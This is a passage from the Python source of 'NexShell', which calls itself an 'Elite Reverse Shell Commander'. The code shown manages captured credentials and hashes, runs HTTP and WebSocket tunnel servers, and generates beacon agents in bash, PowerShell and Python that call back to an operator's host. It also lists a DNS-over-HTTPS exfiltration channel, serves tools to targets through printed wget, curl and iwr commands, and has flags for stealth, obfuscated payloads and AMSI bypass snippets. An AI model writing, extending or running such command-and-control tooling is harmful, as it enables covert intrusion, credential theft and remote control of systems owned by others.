                print(f"  ★ {s.host_ip:<16} {s.port:>5}/{s.protocol}  "
                      f"{s.service:<15} {s.version[:35]}")
            print()

        else:
            cmdlogger.warning(f"Unknown svc subcommand: {sub}")

    # ── creds ──────────────────────────────────────────────────────────────────
    def do_creds(self, line):
        """[list|add|hashes|tokens|crack <user> <pw>|export] — Credential store"""
        line = line or ''
        args = line.split()
        sub  = args[0] if args else 'list'
        cs   = _try_import('inventory.credentials', 'cred_store')
        if not cs:
            cmdlogger.error("Credentials module not loaded"); return

        if sub == 'list':
            print(cs.summary())
            all_creds = cs.all()
            for c in all_creds[:30]:
                print(f"  {c.ts[:16]} {c.host_ip:<16} {c.display()}")
            if all_creds:
                print()

        elif sub == 'show':
            ip = args[1] if len(args) > 1 else None
            print(cs.show(ip))

        elif sub == 'add':
            host = getattr(core.sessions.get(self.sid), 'host', '') if self.sid else ''
            username = ask("Username: ").strip()
            password = ask("Password (or leave blank for hash): ").strip()
            hash_    = ""
            if not password:
                hash_ = ask("Hash: ").strip()
            service  = ask("Service (e.g. ssh, smb): ").strip()
            cred = cs.add(host_ip=host, username=username, password=password,
                          hash_=hash_, service=service,
                          session_id=self.sid or 0, source='manual')
            if cred:
                logger.info(f"Credential added: {paint(username).lime}")
            else:
                cmdlogger.warning("Credential already exists (deduplicated).")

        elif sub == 'hashes':
            hs = cs.hashes()
            if not hs:
                print("  No hashes found."); return
            print(f"\n  Hashes ({len(hs)}):\n")
            for c in hs:
                cracked = f" → {paint(c.cracked_pw).lime}" if c.cracked else ""
                print(f"  {c.username:<20} {c.hash_[:50]}{cracked}")
            print()

        elif sub == 'tokens':
            ts_ = cs.tokens()
            if not ts_:
                print("  No tokens/certificates found."); return
            print(f"\n  Tokens ({len(ts_)}):\n")
            for c in ts_:
                print(f"  [{c.type}] {c.host_ip:<16} {c.token[:60]}")
            print()

        elif sub == 'crack':
            if len(args) < 3:
                cmdlogger.warning("Usage: creds crack <username> <plaintext>"); return
            if cs.mark_cracked(args[1], args[2]):
                logger.info(f"Marked cracked: {args[1]} → {paint(args[2]).lime}")
            else:
                cmdlogger.warning(f"Username not found: {args[1]}")

        elif sub == 'export':
            path = args[1] if len(args) > 1 else 'credentials.txt'
            content = cs.export_list()
            Path(path).write_text(content, encoding='utf-8')
            logger.info(f"Credentials exported → {paint(path).lime} ({len(content.splitlines())} lines)")

        else:
            cmdlogger.warning(f"Unknown creds subcommand: {sub}")



    # ── note ───────────────────────────────────────────────────────────────────
    def do_note(self, line):
        """[add [text]|list|search <kw>|pin <id>|export] — Persistent notes"""
        line = line or ''
        args = line.split()
        sub  = args[0] if args else 'list'
        nm   = _try_import('knowledge.notes', 'notes')
        if not nm:
            cmdlogger.error("Notes module not loaded"); return

        if sub == 'add' or (sub not in ('list', 'search', 'pin', 'export', 'delete')):
            if sub == 'add':
                text = ' '.join(args[1:]) if len(args) > 1 else ask("Note: ").strip()
            else:
                text = line.strip()  # whole line is the note
            if not text:
                cmdlogger.warning("Empty note."); return
            host = getattr(core.sessions.get(self.sid), 'host', '') if self.sid else ''
            n = nm.add(text, context='session' if self.sid else 'general',
                       session_id=self.sid or 0, host=host)
            logger.info(f"Note added [{n.id}]")

        elif sub == 'list':
            limit = int(args[1]) if len(args) > 1 and args[1].isdigit() else 15
            notes = nm.recent(limit)
            print(nm.render(notes))

        elif sub == 'search':
            kw = ' '.join(args[1:]) if len(args) > 1 else None
            if not kw:
                cmdlogger.warning("Usage: note search <keyword>"); return
            results = nm.search(kw)
            if not results:
                cmdlogger.warning(f"No notes match: {kw}"); return
            print(nm.render(results))

        elif sub == 'pin':
            note_id = args[1] if len(args) > 1 else None
            if not note_id:
                cmdlogger.warning("Usage: note pin <id>"); return
            if nm.pin(note_id):
                logger.info(f"Note {note_id} pin toggled.")
            else:
                cmdlogger.warning(f"Note not found: {note_id}")

        elif sub == 'delete':
            note_id = args[1] if len(args) > 1 else None
            if not note_id:
                cmdlogger.warning("Usage: note delete <id>"); return
            if nm.delete(note_id):
                logger.info(f"Note {note_id} deleted.")
            else:
                cmdlogger.warning(f"Note not found: {note_id}")

        elif sub == 'export':
            path = args[1] if len(args) > 1 else 'notes.md'
            nm.export_markdown(path)
            logger.info(f"Notes exported → {paint(path).lime}")

    # ── template ───────────────────────────────────────────────────────────────
    def do_template(self, line):
        """[list|apply <name>] — Engagement templates"""
        line = line or ''
        args = line.split()
        sub  = args[0] if args else 'list'
        tpl_m = _try_import('config.templates', None)
        if not tpl_m:
            cmdlogger.error("Templates module not loaded"); return

        if sub == 'list':
            templates = tpl_m.list_templates()
            print()
            for t in templates:
                print(f"  {t['name']:<20} [{t['type']:<10}] {t['description']}")
            print()

        elif sub == 'apply':
            name = args[1] if len(args) > 1 else None
            if not name:
                cmdlogger.warning("Usage: template apply <name>"); return
            results = tpl_m.apply_template(name)
            for r in results:
                logger.info(r)
            logger.info(f"Template '{paint(name).lime}' applied.")

        elif sub == 'show':
            name = args[1] if len(args) > 1 else None
            if not name:
                cmdlogger.warning("Usage: template show <name>"); return
            t = tpl_m.get_template(name)
            print(f"\n  Template: {t.get('name','?')}")
            print(f"  Type    : {t.get('type','?')}")
            print(f"  OPSEC   : {t.get('opsec_profile','?')}")
            print(f"  Workflows: {', '.join(t.get('workflows',[]))}")
            print(f"  MITRE   : {', '.join(t.get('mitre_focus',[]))}")
            print(f"  Objectives:")
            for obj in t.get('objectives_template', []):
                print(f"    • {obj}")
            print()

        else:
            cmdlogger.warning(f"Unknown template subcommand: {sub}")

    # ── web ───────────────────────────────────────────────────────────────────
    def do_web(self, line):
        """[start [port]|stop|open|status] — Real-time Web Dashboard"""
        line = line or ''
        args = line.split()
        sub  = args[0] if args else 'status'

        if sub in ('start', 'on'):
            port = int(args[1]) if len(args) > 1 and args[1].isdigit() else 8888
            host = args[2] if len(args) > 2 else '127.0.0.1'
            try:
                from web.server import start_dashboard, get_dashboard
                # Stop any existing dashboard
                existing = get_dashboard()
                if existing and existing._running:
                    existing.stop()
                dash = start_dashboard(host=host, port=port)
                logger.info(f"Dashboard started → {paint(dash.url).lime}")
                logger.info(f"Open in browser: {paint(dash.url + '/index.html').lime}")
                # Try to auto-open browser
                try:
                    import webbrowser
                    webbrowser.open(dash.url)
                    logger.info("Browser opened automatically.")
                except Exception:
                    pass
            except Exception as e:
                cmdlogger.error(f"Dashboard failed: {e}")

        elif sub in ('stop', 'off'):
            try:
                from web.server import stop_dashboard, get_dashboard
                dash = get_dashboard()
                if dash and dash._running:
                    stop_dashboard()
                    logger.info("Dashboard stopped.")
                else:
                    cmdlogger.warning("Dashboard is not running.")
            except Exception as e:
                cmdlogger.error(str(e))

        elif sub == 'open':
            try:
                from web.server import get_dashboard
                dash = get_dashboard()
                if dash and dash._running:
                    import webbrowser
                    webbrowser.open(dash.url)
                    logger.info(f"Opened: {dash.url}")
                else:
                    cmdlogger.warning("Dashboard is not running. Use: web start")
            except Exception as e:
                cmdlogger.error(str(e))

        elif sub == 'status':
            try:
                from web.server import get_dashboard
                dash = get_dashboard()
                if dash and dash._running:
                    clients = len(dash._ws_clients)
                    logger.info(f"Dashboard: {paint('RUNNING').lime} → {paint(dash.url).lime} ({clients} browser clients)")
                else:
                    logger.info(f"Dashboard: {paint('STOPPED').yellow}")
            except Exception as e:
                cmdlogger.warning(f"Dashboard not available: {e}")

        elif sub == 'push':
            # Manually push a test event
            try:
                from web.server import get_dashboard
                dash = get_dashboard()
                if dash:
                    dash.push_event('test', {'msg': 'Manual push from CLI', 'ts': time.strftime('%H:%M:%S')})
                    logger.info("Test event pushed to dashboard.")
                else:
                    cmdlogger.warning("Dashboard not running.")
            except Exception as e:
                cmdlogger.error(str(e))

        else:
            cmdlogger.warning(f"Unknown web subcommand: {sub}. Use: start [port] | stop | open | status")

    # ── transport ─────────────────────────────────────────────────────────────
    def do_transport(self, line):

        """[list|http|ws|agent <type> <host> <port> <path>] — Enhanced transport layer"""
        line = line or ''
        args = line.split()
        sub  = args[0] if args else 'list'

        if sub == 'list':
            # Show transport registry
            try:
                from modules.transport_compat import TRANSPORT_INFO
                extra = {
                    'websocket': {'desc': 'WebSocket tunnel (RFC 6455)',   'stealth': '⭐⭐⭐⭐',  'speed': '⚡⚡⚡'},
                    'wss':       {'desc': 'WebSocket over TLS',            'stealth': '⭐⭐⭐⭐⭐', 'speed': '⚡⚡⚡'},
                    'http':      {'desc': 'HTTP POST tunnel (multi-agent)','stealth': '⭐⭐⭐⭐',  'speed': '⚡⚡'},
                    'https':     {'desc': 'HTTPS tunnel (self-signed)',    'stealth': '⭐⭐⭐⭐⭐', 'speed': '⚡⚡'},
                    'doh':       {'desc': 'DNS-over-HTTPS exfil channel',  'stealth': '⭐⭐⭐⭐⭐', 'speed': '⚡'},
                }
                info = {**TRANSPORT_INFO, **extra}
            except Exception:
                info = {}
            print()
            print(f"  {'TRANSPORT':<12} {'STEALTH':<14} {'SPEED':<10} DESCRIPTION")
            print("  " + "─" * 60)
            for name, d in info.items():
                print(f"  {name:<12} {d.get('stealth',''):<14} {d.get('speed',''):<10} {d.get('desc','')}")
            print()

        elif sub == 'http':
            # Start HTTP tunnel server
            port = int(args[1]) if len(args) > 1 and args[1].isdigit() else 8080
            try:
                from modules.transport.http_tunnel import HTTPTunnelServer
                def _on_connect(sess):
                    logger.info(f"[HTTP-TUNNEL] Agent connected: {sess.id} from {sess.addr}")
                srv = HTTPTunnelServer(port=port, on_connect=_on_connect)
                srv.start()
                path = srv.new_session()
                logger.info(f"HTTP Tunnel started on {paint(srv.address).lime}")
                logger.info(f"Agent path: {paint(path).lime}")
                # Store reference
                if not hasattr(self, '_http_tunnels'):
                    self._http_tunnels = {}
                self._http_tunnels[port] = srv
            except Exception as e:
                cmdlogger.error(f"HTTP Tunnel failed: {e}")

        elif sub == 'ws':
            # Start WebSocket server
            port = int(args[1]) if len(args) > 1 and args[1].isdigit() else 9001
            try:
                from modules.transport.websocket import WebSocketServer
                def _on_ws_connect(c):
                    logger.info(f"[WS] Agent connected: {c.id} from {c.addr}")
                def _on_ws_msg(c, msg):
                    logger.info(f"[WS:{c.id}] {msg[:120]}")
                srv = WebSocketServer(port=port,
                                     on_connect=_on_ws_connect,
                                     on_message=_on_ws_msg)
                srv.start()
                logger.info(f"WebSocket server started: {paint(srv.address).lime}")
                if not hasattr(self, '_ws_servers'):
                    self._ws_servers = {}
                self._ws_servers[port] = srv
            except Exception as e:
                cmdlogger.error(f"WebSocket server failed: {e}")

        elif sub == 'agent':
            # Generate agent payload
            # Usage: transport agent <type> <host> <port> [path] [sleep]
            if len(args) < 4:
                cmdlogger.warning("Usage: transport agent <http|https|ws|wss|python|powershell> <host> <port> [path] [sleep]")
                return
            atype = args[1].lower()
            host  = args[2]
            port  = int(args[3]) if args[3].isdigit() else 8080
            path  = args[4] if len(args) > 4 else '/api/ping'
            sleep = int(args[5]) if len(args) > 5 and args[5].isdigit() else 5

            try:
                if atype == 'http':
                    from modules.transport.http_tunnel import generate_http_agent
                    agent = generate_http_agent(host, port, path, sleep)
                    ext   = '.sh'
                elif atype == 'https':
                    from modules.transport.http_tunnel import generate_https_agent
                    agent = generate_https_agent(host, port, path, sleep)
                    ext   = '.sh'
                elif atype in ('powershell', 'ps1'):
                    from modules.transport.http_tunnel import generate_powershell_agent
                    agent = generate_powershell_agent(host, port, path, sleep, https=False)
                    ext   = '.ps1'
                elif atype == 'python':
                    from modules.transport.http_tunnel import generate_python_agent
                    agent = generate_python_agent(host, port, path, sleep)
                    ext   = '.py'
                elif atype == 'ws':
                    from modules.transport.websocket import generate_ws_agent_linux
                    agent = generate_ws_agent_linux(host, port, path, sleep)
                    ext   = '.sh'
                elif atype == 'wss':
                    from modules.transport.websocket import generate_ws_agent_linux
                    agent = generate_ws_agent_linux(host, port, path, sleep, use_ssl=True)
                    ext   = '.sh'
                elif atype in ('ws-py', 'ws-python'):
                    from modules.transport.websocket import generate_ws_agent_python
                    agent = generate_ws_agent_python(host, port, path, sleep)
                    ext   = '.py'
                elif atype in ('ws-ps', 'ws-powershell'):
                    from modules.transport.websocket import generate_ws_agent_windows
                    agent = generate_ws_agent_windows(host, port, path, sleep)
                    ext   = '.ps1'
                else:
                    cmdlogger.warning(f"Unknown agent type: {atype}"); return

                fname = f"agent_{atype}_{host.replace('.','_')}_{port}{ext}"
                Path(fname).write_text(agent, encoding='utf-8')
                logger.info(f"Agent written → {paint(fname).lime}")
                print(f"\n  {agent[:800]}\n  ...\n")
            except Exception as e:
                cmdlogger.error(f"Agent generation failed: {e}")

        elif sub == 'stop':
            port = int(args[1]) if len(args) > 1 and args[1].isdigit() else None
            if port and hasattr(self, '_http_tunnels') and port in self._http_tunnels:
                self._http_tunnels[port].stop()
                del self._http_tunnels[port]
                logger.info(f"HTTP Tunnel stopped on port {port}")
            elif port and hasattr(self, '_ws_servers') and port in self._ws_servers:
                self._ws_servers[port].stop()
                del self._ws_servers[port]
                logger.info(f"WebSocket server stopped on port {port}")
            else:
                cmdlogger.warning("Usage: transport stop <port>")

        elif sub == 'sessions':
            # List active transport sessions
            tunnels = getattr(self, '_http_tunnels', {})
            ws_srvs = getattr(self, '_ws_servers', {})
            if not tunnels and not ws_srvs:
                print("  No active transport servers."); return
            print()
            for port, srv in tunnels.items():
                sessions = srv.list_sessions()
                print(f"  [HTTP] :{port}  ({len(sessions)} sessions)")
                for s in sessions:
                    print(f"    [{s.id}] {s.addr:<16} idle:{s.idle_seconds}s  "
                          f"beacons:{s.beacon_count}")
            for port, srv in ws_srvs.items():
                clients = srv.get_clients()
                print(f"  [WS]   :{port}  ({len(clients)} clients)")
                for c in clients:
                    print(f"    [{c.id}] {c.addr:<16} {c.hostname} idle:{c.idle_seconds}s")
            print()

        else:
            cmdlogger.warning(f"Unknown transport subcommand: {sub}. "
                               "Use: list | http [port] | ws [port] | agent <type> <host> <port> | sessions | stop <port>")

    # ── report ────────────────────────────────────────────────────────────────
    def do_report(self, line):


        """[generate|--format md|html|json] — Generate pentest report"""
        line = line or ''
        args    = line.split()
        sub     = args[0] if args else 'generate'
        rep     = _try_import('reports', 'reporter')
        if not rep:
            cmdlogger.error("Reports module not loaded"); return

        if sub in ('generate', 'gen', ''):
            fmt = 'md'
            # Parse --format flag
            if '--format' in args:
                idx = args.index('--format')
                if idx + 1 < len(args):
                    fmt = args[idx + 1].lower()

            # Determine output path
            out_idx = next((i for i, a in enumerate(args) if not a.startswith('-') and i > 0), None)
            if out_idx and args[out_idx] not in ('generate', 'gen'):
                path = args[out_idx]
            else:
                path = rep.auto_filename(fmt)

            try:
                if fmt == 'html':
                    rep.generate_html(path)
                elif fmt == 'json':
                    rep.generate_json(path)
                else:
                    rep.generate_markdown(path)
                logger.info(f"Report generated → {paint(path).lime} ({fmt.upper()})")
            except Exception as e:
                cmdlogger.error(f"Report generation failed: {e}")

        elif sub == 'preview':
            try:
                md = rep.generate_markdown()
                print(md[:3000] + "\n...(truncated)")
            except Exception as e:
                cmdlogger.error(f"Preview failed: {e}")

        else:
            cmdlogger.warning("Usage: report generate [--format md|html|json] [output_file]")

    # ── config ────────────────────────────────────────────────────────────────
    def do_config(self, line):
        """[show|save|load <name>|list] — Configuration management"""
        line = line or ''
        args = line.split()
        sub  = args[0] if args else 'show'
        cfg  = _try_import('config', 'config')
        if not cfg:
            cmdlogger.error("Config module not loaded"); return

        if sub == 'show':
            print(cfg.show())

        elif sub == 'save':
            name = args[1] if len(args) > 1 else 'default'
            path = cfg.save(name)
            logger.info(f"Config saved to: {paint(path).lime}")

        elif sub == 'load':
            name = args[1] if len(args) > 1 else 'default'
            if cfg.load(name):
                logger.info(f"Config loaded: {paint(name).lime}")
            else:
                cmdlogger.warning(f"Config profile '{name}' not found. "
                                   f"Available: {cfg.list_profiles()}")

        elif sub == 'list':
            profiles = cfg.list_profiles()
            print()
            for p in profiles:
                print(f"  {p}")
            print()

        elif sub == 'opsec':
            from config.profiles import OPSEC_PROFILES
            print()
            for name, prof in OPSEC_PROFILES.items():
                print(f"  {name:<12} — {prof['description']}")
            print()

        else:
            cmdlogger.warning(f"Unknown config subcommand: {sub}")

    # ── health ────────────────────────────────────────────────────────────────
    def do_health(self, line):
        """— Platform health monitor (CPU/RAM/sessions/DB/plugins)"""
        h = _try_import('services.health', 'health')
        if not h:
            cmdlogger.error("Health module not loaded"); return
        print(h.format_report())

    # ── stats ─────────────────────────────────────────────────────────────────
    def do_stats(self, line):
        """— Engagement analytics (session duration, OS dist., loot breakdown)"""
        a = _try_import('services.health', 'analytics')
        if not a:
            cmdlogger.error("Analytics module not loaded"); return
        print(a.format_report())

    # ══════════════════════════════════════════════════════════════════════════
    # EXIT
    # ══════════════════════════════════════════════════════════════════════════
    def do_exit(self, line):
        """— Exit NexShell"""
        if ask(f"Exit NexShell?{self.active_sessions} (y/N): ").lower() == 'y':
            super().do_exit(line)
            core.stop()
            logger.info("NexShell exited. Stay elite. 🔥")
            return True
        return False

    def do_quit(self, line):
        """— Exit NexShell"""
        return self.do_exit(line)

    def do_q(self, line):
        """— Exit NexShell (shortcut)"""
        return self.do_exit(line)

    def do_EOF(self, line):
        if self.sid: self.set_id(None); print()
        else: print("exit"); return self.do_exit(line)


# ══════════════════════════════════════════════════════════════════════════════
#  GLOBALS
# ══════════════════════════════════════════════════════════════════════════════
core = Core()


# ══════════════════════════════════════════════════════════════════════════════
#  ARGUMENT PARSER
# ══════════════════════════════════════════════════════════════════════════════
def build_parser():
    p = ArgumentParser(
        prog=__program__,
        formatter_class=RawTextHelpFormatter,
        description=f"{__program__} {__version__} — Elite Reverse Shell Commander",
        epilog=dedent(f"""
  Examples:
    nexshell                         Listen on 0.0.0.0:4444
    nexshell -p 5555                 Listen on port 5555
    nexshell -p 4444,5555            Listen on multiple ports
    nexshell -a                      Listen + show sample payloads
    nexshell -c target -p 3333       Connect to bind shell
    nexshell -s /path/to/file        Serve a file/folder via HTTP
    nexshell -p 4444 --obfuscate     Listen + show obfuscated payloads
    nexshell --auto-enum             Auto-run QuickEnum on every new shell
    nexshell --auto-share            Auto-start tools/ HTTP share server
    nexshell --lhost 10.10.14.1      Set LHOST explicitly at startup
    nexshell --no-auto-tty           Disable auto TTY upgrade on connection
        """)
    )
    p.add_argument('host', nargs='?', help='Connect to bind shell at this host')
    p.add_argument('-p','--port',      default='4444', help='Port(s) to listen/connect (comma-sep)')
    p.add_argument('-i','--interface', default='any',  help='Network interface')
    p.add_argument('--auto-listen',  action='store_true',
                   help='Auto-start listener(s) on startup (disabled by default; use payloads command)')
    p.add_argument('-c','--connect',   metavar='HOST', help='Connect to bind shell')
    p.add_argument('-s','--serve',     metavar='PATH', help='Serve file/folder via HTTP')
    p.add_argument('-a','--show-payloads', action='store_true', help='Show sample payloads and exit')
    p.add_argument('--obfuscate',    action='store_true', help='Show obfuscated payload variants')
    p.add_argument('--no-upgrade',   action='store_true', help='Disable auto PTY upgrade')
    p.add_argument('--no-attach',    action='store_true', help='Do not auto-attach to new sessions')
    p.add_argument('--single',       action='store_true', help='Exit after first session ends')
    p.add_argument('--maintain',     type=int, default=1, help='Maintain N shells per host')
    p.add_argument('--jitter',       type=int, default=0, help='Jitter (ms) between commands (stealth)')
    p.add_argument('--stealth',      action='store_true', help='Stealth mode: no disk writes on target')
    p.add_argument('--auto-enum',    action='store_true', help='Auto-run QuickEnum on every new session')
    # v2.2 flags
    p.add_argument('--lhost',        metavar='IP',   default=None,
                   help='Override auto-detected LHOST IP')
    p.add_argument('--auto-share',   action='store_true',
                   help='Auto-start HTTP share server for tools/ (port 9001-9100)')
    p.add_argument('--no-auto-tty',  action='store_true',
                   help='Disable automatic TTY upgrade on new sessions')
    p.add_argument('--windows',      action='store_true', help='Show Windows payloads only')
    p.add_argument('--linux',        action='store_true', help='Show Linux payloads only')
    p.add_argument('--amsi',         action='store_true', help='Show AMSI bypass snippets')
    p.add_argument('--debug',        action='store_true', help='Enable debug logging')
    p.add_argument('-v','--version', action='version', version=f'%(prog)s {__version__}')
    return p


# ══════════════════════════════════════════════════════════════════════════════
#  WINDOWS UTF-8 STDOUT FIX
# ══════════════════════════════════════════════════════════════════════════════


# ══════════════════════════════════════════════════════════════════════════════
#  AUTO TOOLS SHARE SERVER
# ══════════════════════════════════════════════════════════════════════════════
def _start_tools_share(port: int = None, background: bool = True):
    """Start HTTP server serving tools/ directory. Auto-finds free port 9001-9100."""
    import http.server, socketserver as _ss

    tools_dir = Path(_NEXSHELL_DIR) / "tools"
    tools_dir.mkdir(exist_ok=True)

    # Find a free port in 9001-9100
    chosen = port or options.share_port
    for p in range(chosen, 9101):
        try:
            s = socket.socket(); s.bind(("0.0.0.0", p)); s.close()
            chosen = p; break
        except OSError:
            continue

    options.share_port = chosen

    class _Handler(http.server.SimpleHTTPRequestHandler):
        def __init__(self, *a, **kw):
            super().__init__(*a, directory=str(tools_dir), **kw)
        def log_message(self, fmt, *a):
            ts = time.strftime("%H:%M:%S")
            logger.info(f"[SHARE] {self.client_address[0]}  {fmt % a}")

    lhost = options.lhost
    urls  = [f"http://{ip}:{chosen}/<file>" for ip in (options.lhost_all or [lhost])]

    def _serve():
        _ss.TCPServer.allow_reuse_address = True
        with _ss.TCPServer(("0.0.0.0", chosen), _Handler) as srv:
            options._share_server = srv
            logger.info(paint(f"[SHARE] Tools server started → port {chosen}").lime)
            for u in urls:
                logger.info(f"  [SHARE] {paint(u).teal}")
            logger.info(f"  [SHARE] wget  http://{lhost}:{chosen}/<tool>")
            logger.info(f"  [SHARE] curl  http://{lhost}:{chosen}/<tool>")
            logger.info(f"  [SHARE] iwr   'http://{lhost}:{chosen}/<tool>' -OutFile <tool>")
            try:
                srv.serve_forever()
            except Exception:
                pass

    if background:
        t = Thread(target=_serve, name="ToolsShare", daemon=True)
        t.start()
        return t
    else:
        _serve()


# ══════════════════════════════════════════════════════════════════════════════
#  STARTUP BANNER
# ══════════════════════════════════════════════════════════════════════════════
def print_banner():
    try:
        lines = __banner__.splitlines()
        for idx, line in enumerate(lines):
            if idx == 0 and not line.strip():
                continue
            if "Nexus of Shell Operations" in line:
                print(f"              {paint('Nexus of Shell Operations').teal}  ·  {paint('Elite Reverse Shell Commander').lime}")
            else:
                print(paint(line).red if idx % 2 == 0 else paint(line).white)
    except (UnicodeEncodeError, UnicodeDecodeError):
        safe = __banner__.encode('ascii', errors='replace').decode()
        for idx, line in enumerate(safe.splitlines()):
            if idx == 0 and not line.strip():
                continue
            if "Nexus of Shell Operations" in line:
                print(f"              {paint('Nexus of Shell Operations').teal}  ·  {paint('Elite Reverse Shell Commander').lime}")
            else:
                print(paint(line).red if idx % 2 == 0 else paint(line).white)

    # Version line
    print(f"  {paint('Version').teal} {paint(__version__).lime}  "
          f"{paint('*').darkgrey}  "
          f"{paint('by').teal} {paint(__author__).orange}  "
          f"{paint('*').darkgrey}  "
          f"Platform: {paint('Windows' if IS_WINDOWS else platform.system()).cyan}  "
          f"Escape: {paint(options.escape['key']).yellow}\n")

    # ── System Info Box ───────────────────────────────────────────────────
    _print_sysinfo_box()


def _print_sysinfo_box():
    """Print operator system info with LHOST prominently displayed."""
    lhost   = options.lhost
    all_ips = options.lhost_all
    os_name = platform.system() + ' ' + platform.release()
    shell   = options.shell_type
    term    = options.terminal_type
    plugins = len(_list_plugin_names())

    if HAS_RICH and _rcon:
        from rich.table import Table as _T
        from rich       import box   as _B
        t = _T(show_header=False, box=_B.ROUNDED, border_style="bright_blue",
               padding=(0, 2), expand=False)
        t.add_column("k", style="dim",          width=14)
        t.add_column("v", style="bright_white")
        t.add_row("LHOST",    f"[bold bright_green]{lhost}[/]"
                              + (f"  [dim]({', '.join(all_ips[1:])})[/]" if len(all_ips) > 1 else ""))
        t.add_row("OS",       f"[cyan]{os_name}[/]")
        t.add_row("Shell",    f"[yellow]{shell}[/]")
        t.add_row("Terminal", f"[yellow]{term}[/]")
        t.add_row("Plugins",  f"[bright_magenta]{plugins}[/]")
        t.add_row("REPL",     "[bold bright_green]prompt_toolkit[/]" if HAS_PROMPT_TOOLKIT
                              else "[dim]readline (pip install prompt_toolkit for autocomplete)[/]")
        from rich.panel import Panel as _P
        _rcon.print(_P(t, title="[bold bright_blue]System Info[/]",
                       border_style="bright_blue", padding=(0, 1)))
        _rcon.print()
    else:
        W = 58
        sep = paint('─' * W).darkgrey
        print(f"  {paint('╭' + '─'*W + '╮').darkgrey}")
        def _row(k, v, vc='cyan'):
            kp = paint(f"  {k:<12}").darkgrey
            vp = getattr(paint(str(v)), vc)
            pad = W - len(k) - len(str(v)) - 4
            print(f"  {paint('│').darkgrey}{kp} {vp}{' '*max(0,pad)}{paint('│').darkgrey}")
        _row('LHOST',    lhost,   'lime')
        _row('OS',       os_name, 'cyan')
        _row('Shell',    shell,   'yellow')
        _row('Terminal', term,    'yellow')
        _row('Plugins',  plugins, 'orange')
        print(f"  {paint('╰' + '─'*W + '╯').darkgrey}\n")


def _list_plugin_names() -> list:
    """Return list of discovered plugin names (no import)."""
    p = Path(_NEXSHELL_DIR) / "plugins"
    if not p.exists():
        return []
    return [f.stem for f in sorted(p.glob("*.py"))
            if not f.name.startswith("_")]




# ══════════════════════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════════════════════
def main():
    global menu

    args = build_parser().parse_args()

    # Apply options
    options.no_upgrade      = args.no_upgrade
    options.no_attach       = args.no_attach
    options.single_session  = args.single
    options.maintain        = args.maintain
    options.jitter          = args.jitter
    options.stealth_mode    = args.stealth
    options.auto_enum       = args.auto_enum
    options.debug           = args.debug

    if args.debug:
        logger.setLevel(logging.DEBUG)
        cmdlogger.setLevel(logging.DEBUG)

    ports = [int(p.strip()) for p in args.port.split(',')]
    options.ports = ports

    # ── v2.2: Detect system info (LHOST, shell, terminal) ──────────────────
    options.lhost_all     = _get_all_local_ips()
    options.shell_type    = _detect_shell()
    options.terminal_type = _detect_terminal()

    # --lhost flag overrides auto-detection
    if getattr(args, 'lhost', None):
        options.lhost = args.lhost
        if args.lhost not in options.lhost_all:
            options.lhost_all.insert(0, args.lhost)
    else:
        options.lhost = options.lhost_all[0] if options.lhost_all else _get_lhost()

    # --no-auto-tty flag
    if getattr(args, 'no_auto_tty', False):
        options.auto_tty = False

    print_banner()

    # ── v2.2: Auto file-share server (tools/) ──────────────────────────────
    if getattr(args, 'auto_share', False):
        options.auto_share = True
        _start_tools_share(background=True)

    # -- Load plugins
    try:
        from core.plugin import registry as _plugin_registry
        loaded = _plugin_registry.discover()
        if loaded:
            logger.debug(f"Plugins loaded: {len(loaded)} → {', '.join(loaded)}")
    except Exception as _pe:
        logger.debug(f"Plugin discovery failed: {_pe}")

    # -- Serve mode
    if args.serve:
        path = Path(args.serve).expanduser().resolve()
        if not path.exists():
            logger.error(f"Path not found: {path}"); sys.exit(1)
        os.chdir(path if path.is_dir() else path.parent)
        import http.server
        handler = http.server.SimpleHTTPRequestHandler
        handler.log_message = lambda *a: None
        addr = ('0.0.0.0', 8000)
        with http.server.HTTPServer(addr, handler) as srv:
            logger.info(f"Serving {path} on http://0.0.0.0:8000")
            try: srv.serve_forever()
            except KeyboardInterrupt: pass
        return

    # -- Show AMSI bypass
    if hasattr(args,'amsi') and args.amsi:
        try:
            from modules.windows import AMSI_BYPASSES, get_amsi_bypass
            print(f'\n  {paint("AMSI Bypass Variants").purple_BRIGHT}\n')
            for name, code in AMSI_BYPASSES.items():
                print(f'  {paint(f"[{name}]").orange}\n  {paint(code).white}\n')
        except ImportError:
            print("Windows module not available")
        return

    # -- Show payloads only
    if args.show_payloads:
        iface_ips = Interfaces().ips
        host = iface_ips[0] if iface_ips else '0.0.0.0'
        target_os = 'windows' if hasattr(args,'windows') and args.windows else \
                    'linux'   if hasattr(args,'linux')   and args.linux   else 'all'
        for port in ports:
            PayloadGenerator.display(host, port, obfuscate=args.obfuscate, target_os=target_os)
        return

    # -- Main menu
    menu = MainMenu()
    menu.set_id(None)

    # -- Start listeners (only if --auto-listen flag is passed)
    # Auto-listener is disabled by default; use 'payloads' command to generate
    # payloads + auto-start listener, or use 'listeners add -p <port>' manually.
    if getattr(args, 'auto_listen', False):
        for port in ports:
            TCPListener(Interfaces().translate(args.interface), port)

    # -- Connect mode
    target = args.host or args.connect
    if target:
        Connect(target, ports[0])

    menu.show()
    menu.start()


if __name__ == '__main__':
    main()
